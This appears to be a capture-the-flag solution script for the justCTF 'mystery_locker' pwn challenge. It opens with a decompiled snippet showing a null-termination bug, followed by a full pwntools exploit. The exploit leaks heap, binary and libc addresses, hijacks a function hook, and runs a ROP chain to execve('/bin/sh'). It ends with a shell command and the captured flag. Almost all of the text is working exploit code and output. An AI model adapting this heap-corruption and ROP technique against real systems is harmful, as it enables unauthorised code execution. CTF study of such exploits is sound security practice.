'''
00001516      int32_t capped_length = 0x400
0000151e      if (readlen u<= 0x400)
0000151e          capped_length = readlen
00001525      char* ret_alloc = malloc(bytes: sx.q(capped_length))
......
              // BUG: uses the non-capped length to null-terminate
0000156c      ret_alloc[sx.q(readlen)] = 0c
'''


from pwn import *

e = ELF("./mystery_locker_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.37.so")
context.binary = e

def get_con():
    if args.REMOTE:
        # nc mysterylocker.nc.jctf.pro 1337
        p = remote("mysterylocker.nc.jctf.pro", 1337)
    else:
        if args.GDB:
            p = gdb.debug([e.path], '''
            # ---< Your gdb script here >---
            # b * 0x55555555556c
            continue
            ''', aslr=False)
        else:
            p = process([e.path])
    return p

def create_file(name, contents, filename_len=None, content_len=None) -> str:
    filename_len = filename_len or len(name)
    content_len = content_len or len(contents)
    p.sendlineafter(b"> ", b"0")
    p.sendlineafter(b"fname size: ", str(filename_len).encode())
    p.sendafter(b"fname: ", name)
    p.sendlineafter(b"contents len: ", str(content_len).encode())
    p.sendafter(b"contents: ", contents)
    p.recvuntil(b"Data saved to: ")
    return p.recvline().strip().decode('ascii')

def rename_file(name, new_name, does_not_exist=False) -> None:
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"fname size: ", str(len(name)).encode())
    p.sendafter(b"fname: ", name)
    if does_not_exist:
        p.recvuntil(b"does not exist")
        return
    p.sendlineafter(b"new fname size: ", str(len(new_name)).encode())
    p.sendafter(b"new fname: ", new_name)

def print_file(name, filename_len=None) -> bytes:
    filename_len = filename_len or len(name)
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"fname size: ", str(filename_len).encode())
    p.sendafter(b"fname: ", name)
    return p.recvuntil(b"\n0. create", drop=True)

def delete_file(name, filename_len=None) -> None:
    filename_len = filename_len or len(name)
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"fname size: ", str(filename_len).encode())
    p.sendafter(b"fname: ", name)

def exit() -> None:
    p.sendlineafter("> ", "4")

def get_random_name(l) -> str:
    return ''.join(random.choice(string.ascii_letters) for _ in range(l)).encode()


# Good luck, you've got this!

os.system("rm -rf fs/")
p = get_con()


create_file(b"."*0x18, "x"*0x38)

####################################################################################################
## Stage 1: Get a heap leak
####################################################################################################
create_file(b"x"*0x38, b"A"*0x400)

# BUG: content won't be null-terminated
create_file(b"y"*0x38, b"\x00", content_len=0x800) # reclaim (this writes a null byte into the wilderness)

# read the file back
leak = print_file(b"y"*0x38)[:5]
leak = u64(leak + b"\x00"*3)
log.info(f"leak: {hex(leak)}")
heap_base = (leak << 12)
log.info(f"heap_base: {hex(heap_base)}")

####################################################################################################
## Stage 2: Leak a text address
####################################################################################################

for i in range(0x2f8, 0x328, 0x10):
    create_file(b"."*i, "x"*i)

delete_file("\x00", filename_len=-6416)
delete_file("\x00", filename_len=-7440)

def write_slot(i, ptr, l):
    assert l in [0x18, 0x38]
    payload = i*8*b"A"
    payload += p64(ptr)
    # slice at the null-byte + 1
    payload = payload[:payload.index(b"\x00")+1]
    print_file(payload, filename_len=l)

ft = heap_base + 0x2a0
write_slot(0, ft, 0x18)


fn = b"text-leak" + b"x"*0x40
create_file(fn, b"\x00", content_len=0x2f8)
leak = print_file(fn)[:6]
leak = u64(leak + b"\x00"*2)
log.info(f".text leak: {hex(leak)}")
e.address = leak - 0x1db4
log.info(f"binary @ {hex(e.address)}")

####################################################################################################
## Stage 3: leak a libc address
####################################################################################################
def install_hook(hook):
    log.info(f"Installing hook: {hex(hook)}")
    payload  = b"A"*8
    payload += b"B"*8
    payload += p64(hook)
    payload = payload[:payload.index(b"\x00")+1]
    filename = get_random_name(0x58)
    create_file(filename, payload, content_len=0x28)

install_hook(e.plt.free)
p.sendlineafter(b"> ", b"2") # trigger free
do_print = e.address + 0x1b03
install_hook(do_print)

def do_leak(offset):
    fn = b"libc-leak" + b"x"*0x40
    create_file(fn, b"X"*offset + b"\x00", content_len=0x3f0)

    # We have to burn a tcache slot here, otherwire print will crash
    rename_file("lmaoxd", "uwu", does_not_exist=True)

    leak = print_file(fn)[offset:offset + 6]
    leak = u64(leak + b"\x00"*2)
    return leak

leak = do_leak(0x18)
log.info(f"libc leak: {hex(leak)}")
libc.address = leak - 0x2170b9
if not args.GDB:
    libc.address += 0x6000
    libc.address &= ~0xfff
log.info(f"libc @ {hex(libc.address)}")

####################################################################################################
## Stage 4: call libc
####################################################################################################

# None of the one_gadgets work, so we'll just do a ropchain
# rdi points to the stack, so we can just call gets
install_hook(libc.sym.gets)
p.sendlineafter(b"> ", b"2") # trigger gets

payload = cyclic(1320)
r = ROP(libc)
r.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)
payload += r.chain()
p.sendline(payload)

p.sendline("cat *.txt; ./readflag")

p.interactive()

'''
  p.sendline("cat *.txt; ./readflag")
[*] Switching to interactive mode
justCTF{0h_n0_y0u_unl0ck3d_my_l0ck3r_4nd_th3r3_1s_4_h34p_0f_c01ns_1ns1de}
: 1: ./readflag: not found
'''


